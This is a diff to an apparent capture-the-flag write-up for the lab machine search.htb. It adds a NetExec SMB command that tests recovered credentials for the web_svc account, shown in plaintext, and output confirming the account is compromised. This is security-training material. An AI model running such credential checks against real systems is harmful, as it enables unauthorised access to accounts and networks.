@@ -286,3 +286,10 @@ web_svc:@3ONEmillionbaby
 ```
 Ill verify these credentials
 
+```python
+nxc smb research.search.htb -u web_svc -p '@3ONEmillionbaby'                                                                                       
+SMB         10.129.229.57   445    RESEARCH         [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.229.57   445    RESEARCH         [+] search.htb\web_svc:@3ONEmillionbaby
+```
+This user is compromised!
+
